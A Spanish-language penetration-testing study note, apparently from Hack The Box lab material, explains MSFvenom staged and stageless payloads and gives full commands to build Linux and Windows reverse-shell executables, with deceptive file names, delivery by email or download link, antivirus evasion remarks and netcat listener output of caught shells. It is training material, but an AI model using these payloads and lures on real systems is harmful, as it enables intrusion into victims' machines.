Además de proporcionar una carga útil con opciones de entrega flexibles, MSFvenom también nos permite `encrypt` & `encode`cargas útiles para eludir las firmas de detección antivirus comunes.

## Practicando con MSFvenom
En cualquier host con MSFvenom instalado, podemos emitir el comando `msfvenom -l payloads`para enumerar todas las cargas útiles disponibles.
```js
msfvenom -l payloads
```

## Staged vs. Stageless Payloads
Las Staged Payloads nos permiten enviar más componentes de nuestro ataque. Podemos pensar en ello como si estuviéramos "preparando el escenario" para algo aún más útil. Tomemos por ejemplo este payload linux/x86/shell/reverse_tcp. Cuando se ejecuta utilizando un módulo de exploit en Metasploit, esta carga útil enviará una pequeña etapa que se ejecutará en el objetivo y luego llamará de nuevo a la caja de ataque para descargar el resto de la carga útil a través de la red, a continuación, ejecuta el shellcode para establecer una shell inversa. Por supuesto, si usamos Metasploit para ejecutar este payload, necesitaremos configurar las opciones para que apunten a las IPs y puerto adecuados para que el listener atrape con éxito la shell. Ten en cuenta que una etapa también ocupa espacio en memoria, lo que deja menos espacio para el payload. Lo que ocurre en cada etapa puede variar dependiendo de la carga útil.

Los Stageless Payloads no tienen etapa. Tomemos por ejemplo este payload linux/zarch/meterpreter_reverse_tcp. Usando un módulo exploit en Metasploit, este payload será enviado en su totalidad a través de una conexión de red sin etapa. Esto podría beneficiarnos en entornos donde no tenemos acceso a mucho ancho de banda y la latencia puede interferir. Los payloads staged podrían llevar a sesiones de shell inestables en estos entornos, por lo que sería mejor seleccionar un payload stageless. Además de esto, los payloads stageless a veces pueden ser mejores para propósitos de evasión debido a que pasa menos tráfico por la red para ejecutar el payload, especialmente si lo entregamos empleando ingeniería social. Este concepto también está muy bien explicado por Rapid 7 en esta entrada de blog sobre las [cargas útiles stageless de Meterpreter.](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)

Ahora que entendemos las diferencias entre una carga útil por etapas y sin etapas, podemos identificarlas dentro de Metasploit. La respuesta es simple. El `name`te dará tu primer marcador. Tome nuestros ejemplos de arriba:
- `linux/x86/shell/reverse_tcp`es una carga útil por etapas, y podemos saberlo por el nombre, ya que cada / en su nombre representa una etapa desde el shell en adelante. Entonces `/shell/` es un escenario para enviar, y `/reverse_tcp`es otro. Parecerá que todo está presionado para una carga útil sin etapas. 
- Tome nuestro ejemplo `linux/zarch/meterpreter_reverse_tcp`. Es similar a la carga útil por etapas excepto que especifica la arquitectura a la que afecta, luego tiene la carga útil del shell y las comunicaciones de red, todo dentro de la misma función. `/meterpreter_reverse_tcp`. 
- Para un último ejemplo rápido de esta convención de nomenclatura, considere estos dos 
- `windows/meterpreter/reverse_tcp` 
- `windows/meterpreter_reverse_tcp`. 
El primero es un `Staged`carga útil. Observe la convención de nomenclatura que separa las etapas. Este último es un `Stageless`carga útil ya que vemos la carga útil del shell y la comunicación de red en la misma parte del nombre. Si el nombre de la carga útil no le parece muy claro, a menudo se detallará en la descripción si la carga útil está en etapa o sin etapa.


## Construyendo una carga útil sin etapas
```js
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.15.13 LPORT=443 -f elf > createbackup.elf
```


**-p** : Crea el payload.
**linux/x64/shell_reverse_tcp** : Especifica un payload linux 64-bit stageless que inciara un reverse shell basado en TCP (Shell_reverse_tcp).
**LHOST=10.10.15.13 LPORT=443** : Direccion y puerto al cual conectarse. Cuando se ejecuta, la carga útil volverá a llamar a la dirección IP especificada ( `10.10.14.113`) en el puerto especificado ( `443`).
**-f elf** : El `-f` El indicador especifica el formato en el que estará el binario generado. En este caso, será un [archivo .elf](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format) .
**createbackup.elf** :  Crea el binario .elf y le da al archivo el nombre createbackup. Podemos nombrar este archivo como queramos. Idealmente, lo llamaríamos algo discreto y/o algo que alguien estaría tentado a descargar ejecutar.

## Ejecutar una carga útil sin etapas
Ahora necesitaríamos desarrollar una manera de llevar esa carga útil al sistema objetivo. Hay innumerables maneras de hacer esto. Estas son sólo algunas de las formas más comunes:
- Mensaje de correo electrónico con el archivo adjunto.
- Enlace de descarga en un sitio web.
- Combinado con un módulo de explotación Metasploit (esto probablemente requeriría que ya estemos en la red interna).
- A través de una unidad flash como parte de una prueba de penetración in situ.

#### Conexión NC (esperando a que se ejcute el paylaod en la maquina victima)
```js
sudo nc -lvnp 443
```

#### Conexión establecida
```js
p314d0@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
env
PWD=/home/htb-student/Downloads
cd ..
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
```


## Creación de una carga útil sin etapas simple para un sistema Windows

```js
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

La sintaxis del comando se puede dividir de la misma manera que lo hicimos anteriormente. Las únicas diferencias, por supuesto, son la `platform` ( `Windows`) y formato ( `.exe`) de la carga útil.

## Ejecutar una carga útil simple y sin etapas en un sistema Windows
Esta es otra situación en la que debemos ser creativos para entregar esta carga útil a un sistema de destino. Sin ningún `encoding` o `encryption`, es casi seguro que Windows Defender AV detectará la carga útil en este formato.
Si el AV estuviera deshabilitado, todo lo que el usuario tendría que hacer es hacer doble clic en el archivo para ejecutarlo y tendríamos una sesión de shell.
```js
p314d0@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DD25-26EB

 Directory of C:\Users\htb-student\Downloads

09/23/2021  10:26 AM    <DIR>          .
09/23/2021  10:26 AM    <DIR>          ..
09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe
               1 File(s)         73,802 bytes
               2 Dir(s)   9,997,516,800 bytes free
```

